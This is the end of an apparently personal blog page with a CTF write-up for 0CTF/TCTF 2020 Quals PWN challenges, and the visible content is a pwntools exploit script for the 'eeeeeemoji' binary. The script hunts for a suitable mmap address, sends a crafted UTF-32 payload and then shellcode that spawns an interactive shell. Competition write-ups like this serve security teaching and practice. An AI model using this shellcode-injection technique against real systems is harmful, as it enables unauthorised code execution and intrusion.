<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c</span><span class="params">(s)</span>:</span></span><br><span class="line">   <span class="keyword">return</span> s.ljust(<span class="number">4</span>,<span class="string">"\x00"</span>).decode(<span class="string">'utf-32'</span>).encode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func1</span><span class="params">()</span>:</span></span><br><span class="line">    m1=<span class="string">"\xf0\x9f\x90\xb4"</span></span><br><span class="line">    p.sendlineafter(<span class="string">"miaow\n"</span>,m1)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mmap</span><span class="params">()</span>:</span></span><br><span class="line">    m1=<span class="string">"\xf0\x9f\x8d\xba"</span></span><br><span class="line">    p.sendlineafter(<span class="string">"miaow\n"</span>,m1)</span><br><span class="line">    p.recvuntil(<span class="string">"mmap() at @"</span>)</span><br><span class="line">    <span class="keyword">return</span> int(p.recvuntil(<span class="string">"\n"</span>),<span class="number">16</span>)</span><br><span class="line"><span class="comment">#context.log_level="debug"</span></span><br><span class="line">context.arch=<span class="string">"amd64"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">   p=process(<span class="string">"./eeeeeemoji"</span>)</span><br><span class="line">   <span class="comment">#p=remote("pwnable.org",31323)</span></span><br><span class="line">   s=<span class="number">0</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    s=mmap()</span><br><span class="line">    <span class="keyword">print</span> hex(s)</span><br><span class="line">    <span class="keyword">if</span> bin(s).count(<span class="string">"1"</span>)&lt;=<span class="number">2</span> <span class="keyword">and</span> (s&amp;<span class="number">0xffff</span>)==<span class="number">0x8000</span>:</span><br><span class="line">         <span class="keyword">print</span> hex(s) </span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line">   func1()</span><br><span class="line">   <span class="comment">#gdb.attach(p)</span></span><br><span class="line">   payload= c(<span class="string">'X\xc3'</span>) +c(<span class="string">"\x0f\x05"</span>) +<span class="string">'a'</span>*<span class="number">14</span>+c(<span class="string">"sh"</span>)+c(<span class="string">""</span>)</span><br><span class="line">   payload+=c(p32(s+<span class="number">6</span>))+c(<span class="string">"\x00"</span>)</span><br><span class="line">   payload+=c(<span class="string">""</span>)+c(<span class="string">""</span>)</span><br><span class="line">   payload+=c(<span class="string">"\xf0"</span>)+c(<span class="string">""</span>)</span><br><span class="line">   payload+=c(<span class="string">""</span>)*<span class="number">2</span></span><br><span class="line">   payload+=c(p32(s+<span class="number">0x88</span>))+c(<span class="string">""</span>)</span><br><span class="line">   payload+=c(p32(s+<span class="number">0x88</span>))+c(<span class="string">""</span>)</span><br><span class="line">   payload+=c(p32(s+<span class="number">0x88</span>))+c(<span class="string">""</span>)  </span><br><span class="line">   payload+=c(p32(s+<span class="number">0x88</span>))+c(<span class="string">""</span>)  </span><br><span class="line">   payload+=c(p32(s))+c(<span class="string">""</span>)   </span><br><span class="line">   payload+=c(p32(<span class="number">0</span>))+c(<span class="string">""</span>)  </span><br><span class="line">   payload+=c(p32(s+<span class="number">4</span>))+c(<span class="string">""</span>)   </span><br><span class="line">   payload+=<span class="string">"a"</span>*(<span class="number">0x80</span><span class="number">-40</span>)</span><br><span class="line">   p.send(payload+c(<span class="string">'!\xd4\x00\x00'</span>))</span><br><span class="line">   p.sendlineafter(<span class="string">"\x00\x00"</span>,asm(shellcraft.sh()))</span><br><span class="line">   p.interactive()</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">print</span> <span class="string">"fail"</span></span><br></pre></td></tr></table></figure>
  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/CTF-Writeups/">CTF-Writeups</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#DUET"><span class="toc-number">1.</span> <span class="toc-text">DUET</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#simple-echoserver"><span class="toc-number">2.</span> <span class="toc-text">simple echoserver</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#eeeeeeemoji"><span class="toc-number">3.</span> <span class="toc-text">eeeeeeemoji</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/06/29/0CTF-TCTF-2020-Quals-PWN/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/06/29/0CTF-TCTF-2020-Quals-PWN/&text=0CTF/TCTF 2020 Quals PWN" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/06/29/0CTF-TCTF-2020-Quals-PWN/&title=0CTF/TCTF 2020 Quals PWN" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/06/29/0CTF-TCTF-2020-Quals-PWN/&is_video=false&description=0CTF/TCTF 2020 Quals PWN" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=0CTF/TCTF 2020 Quals PWN&body=Check out this article: http://yoursite.com/2020/06/29/0CTF-TCTF-2020-Quals-PWN/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/06/29/0CTF-TCTF-2020-Quals-PWN/&title=0CTF/TCTF 2020 Quals PWN" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/06/29/0CTF-TCTF-2020-Quals-PWN/&title=0CTF/TCTF 2020 Quals PWN" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/06/29/0CTF-TCTF-2020-Quals-PWN/&title=0CTF/TCTF 2020 Quals PWN" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/06/29/0CTF-TCTF-2020-Quals-PWN/&title=0CTF/TCTF 2020 Quals PWN" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/06/29/0CTF-TCTF-2020-Quals-PWN/&name=0CTF/TCTF 2020 Quals PWN&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 Kirin
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/CTF-Writeups/">CTF-Writeups</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
</body>
</html>
<!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


<!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


